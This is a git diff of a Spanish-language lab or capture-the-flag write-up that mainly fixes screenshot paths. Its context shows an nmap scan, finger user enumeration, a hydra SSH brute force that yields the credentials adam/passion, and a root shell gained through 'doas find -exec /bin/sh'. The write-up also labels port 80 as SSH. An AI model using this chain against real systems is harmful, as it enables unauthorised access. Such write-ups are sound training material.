@@ -32,6 +32,7 @@ IP objetivo: `192.168.1.144`
 nmap -sS -p- -sV -O --open --min-rate 5000 -n -oN scan 192.168.1.144
 ```
 ![Escaneo Nmap](screenshots/01-nmap-scan.png)
+
 Puertos encontrados:
 - **80 (SSH)**
 - **79 (Finger)**
@@ -91,7 +92,7 @@ set USERS_LIST /usr/share/seclists/Usernames/Names/names.txt
 run
 ```
 
-![Enumeración de usuarios finger](02-user-enum-finger.png)
+![Enumeración de usuarios finger](screenshots/02-user-enum-finger.png)
 
 Resultado: el usuario `adam` existe en el sistema.
 
@@ -108,7 +109,7 @@ El usuario `adam` tiene shell asignada, lo que lo convierte en objetivo válido 
 ```bash
 hydra -l adam -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.144
 ```
-|[Fuerza bruta a SSH](03-hydra-brute-force-ssh.png)
+![Fuerza bruta a SSH](screenshots/03-hydra-brute-force-ssh.png)
 
 Credenciales obtenidas:
 
@@ -121,7 +122,7 @@ Contraseña: `passion`
 ssh adam@192.168.1.144
 ```
 
-![Acceso SSH](04-ssh-connection.png)
+![Acceso SSH](screenshots/04-ssh-connection.png)
 
 Acceso confirmado como usuario `adam`.
 
@@ -181,7 +182,7 @@ La regla autoriza al usuario `adam` a ejecutar `/usr/bin/find` como root, sin co
 doas /usr/bin/find . -exec /bin/sh \; -quit
 ```
 
-|[Escalada de privilegios find suid](05-find-suid-privesc.png)
+|[Escalada de privilegios find suid](screenshots/05-find-suid-privesc.png)
 
 Shell obtenida como `root`.
 
